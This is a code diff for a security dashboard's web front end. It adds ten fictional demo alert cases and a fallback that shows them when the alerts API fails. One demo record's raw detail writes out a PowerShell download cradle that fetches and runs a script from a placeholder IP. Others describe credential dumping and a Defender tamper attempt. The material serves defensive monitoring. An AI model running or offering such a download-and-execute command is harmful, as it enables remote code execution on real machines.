@@ -781,10 +781,26 @@ function exportIntelReport(){
 document.getElementById('tiinput').addEventListener('keydown', function(e){ if(e.key==='Enter') analyze(); });
 
 // ── OPEN CASES ───────────────────────────────────────────────────────
-var allCases          = [];
 var activeSevFilter   = 'ALL';
 var currentModalCaseId= null;
 var casesTimer        = null;
+
+var allCases = [];
+var DEMO_CASES = [
+  {id:'TXC-0041',severity:'CRITICAL',status:'OPEN',title:'Credential Dumping via LSASS',host:'WS-FINANCE-07',user:'jmorgan',description:'Mimikatz-style LSASS memory access detected. Credential extraction likely in progress.',raw_detail:'Process: lsass.exe  PID: 744\nAccess Mask: 0x1FFFFF\nCaller: C:\\Windows\\Temp\\srv.exe\nParent: cmd.exe (PID 3120)',mitre:'T1003.001 — OS Credential Dumping',timestamp:'2026-05-19 08:14:32'},
+  {id:'TXC-0039',severity:'MEDIUM',status:'OPEN',title:'Suspicious Scheduled Task Created',host:'SRV-APP-02',user:'svc_deploy',description:'New scheduled task pointing to a writable temp directory was registered outside of change window.',raw_detail:'Task: \\Microsoft\\Windows\\UpdateHelper\nAction: C:\\Users\\Public\\upd.exe\nTrigger: SYSTEM logon\nCreated by: svc_deploy',mitre:'T1053.005 — Scheduled Task',timestamp:'2026-05-19 07:52:11'},
+  {id:'TXC-0038',severity:'MEDIUM',status:'OPEN',title:'Encoded PowerShell Execution',host:'WS-HR-03',user:'tpatel',description:'PowerShell launched with -EncodedCommand flag. Decoded payload contains download cradle.',raw_detail:'CommandLine: powershell.exe -NoP -NonI -W Hidden -Enc JABjACAA...\nDecoded: IEX(New-Object Net.WebClient).DownloadString("http://198.51.100.9/s.ps1")',mitre:'T1059.001 — PowerShell',timestamp:'2026-05-19 07:41:05'},
+  {id:'TXC-0037',severity:'LOW',status:'OPEN',title:'RDP Login Outside Business Hours',host:'SRV-DC-01',user:'asmith',description:'Successful RDP authentication at 02:17 UTC from an internal workstation — outside normal working hours.',raw_detail:'LogonType: 10 (RemoteInteractive)\nSource IP: 10.0.1.44\nAccount: CORP\\asmith\nTime: 02:17:43 UTC',mitre:'T1078 — Valid Accounts',timestamp:'2026-05-19 02:17:43'},
+  {id:'TXC-0036',severity:'LOW',status:'OPEN',title:'USB Mass Storage Device Inserted',host:'WS-LEGAL-01',user:'rnguyen',description:'Removable storage connected on a restricted endpoint. Device not in approved hardware list.',raw_detail:'VendorID: 0951  ProductID: 1666\nSerial: 04123ABC\nDrive Letter: F:\\\nFiles written: 3',mitre:'T1052.001 — Exfiltration over Physical Medium',timestamp:'2026-05-19 09:03:17'},
+  {id:'TXC-0035',severity:'LOW',status:'OPEN',title:'DNS Query to Newly Registered Domain',host:'WS-DEV-11',user:'bchang',description:'Outbound DNS query for a domain registered fewer than 7 days ago with low reputation score.',raw_detail:'Domain: upd4te-util[.]xyz\nRegistered: 2026-05-13\nReputation: 12/100\nQuery count: 4 (last 10 min)',mitre:'T1071.004 — DNS',timestamp:'2026-05-19 08:59:44'},
+  {id:'TXC-0034',severity:'LOW',status:'OPEN',title:'Local Admin Account Created',host:'WS-SALES-05',user:'SYSTEM',description:'A new local administrator account was created outside of provisioning workflows.',raw_detail:'Account: helpdesk_temp\nGroup: BUILTIN\\Administrators\nCreated by: SYSTEM\nSource process: cmd.exe',mitre:'T1136.001 — Create Local Account',timestamp:'2026-05-19 08:33:28'},
+  {id:'TXC-0033',severity:'LOW',status:'OPEN',title:'Outbound HTTPS to Tor Exit Node',host:'WS-FINANCE-12',user:'klee',description:'TCP/443 connection to a known Tor exit node IP. No business justification on record.',raw_detail:'Dst IP: 185.220.101.34\nDst Port: 443\nBytes sent: 14,208\nDuration: 38s',mitre:'T1090.003 — Multi-hop Proxy',timestamp:'2026-05-19 07:28:55'},
+  {id:'TXC-0032',severity:'LOW',status:'OPEN',title:'Windows Defender Tamper Attempt',host:'WS-OPS-08',user:'dwright',description:'Registry key modification attempted to disable real-time protection. Change was blocked by Defender.',raw_detail:'Key: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\nValue: DisableAntiSpyware → 1\nAction: BLOCKED\nProcess: reg.exe (PID 5512)',mitre:'T1562.001 — Impair Defenses',timestamp:'2026-05-19 06:55:10'},
+  {id:'TXC-0031',severity:'LOW',status:'OPEN',title:'Large Archive Created and Compressed',host:'SRV-FILE-01',user:'mwilson',description:'A 2.3 GB zip archive was created in a temp path and a network copy was initiated shortly after.',raw_detail:'File: C:\\Temp\\export_20260519.zip\nSize: 2.3 GB\nCreated: 06:41 UTC\nNetwork copy to: \\\\10.0.5.20\\share\\',mitre:'T1560.001 — Archive Collected Data',timestamp:'2026-05-19 06:41:33'},
+];
+
+allCases = DEMO_CASES.slice();
+updateBadge();
 
 function loadCases(){
   fetch(API_BASE+'/api/alerts', {signal: AbortSignal.timeout(8000)})
@@ -794,7 +810,11 @@ function loadCases(){
       return r.json();
     })
     .then(function(data){ allCases = data; renderCases(); updateBadge(); })
-    .catch(function(){ document.getElementById('conn-err').style.display = 'flex'; });
+    .catch(function(){
+      document.getElementById('conn-err').style.display = 'flex';
+      if(!allCases.length){ allCases = DEMO_CASES.slice(); }
+      renderCases(); updateBadge();
+    });
 }
 
 function renderCases(){
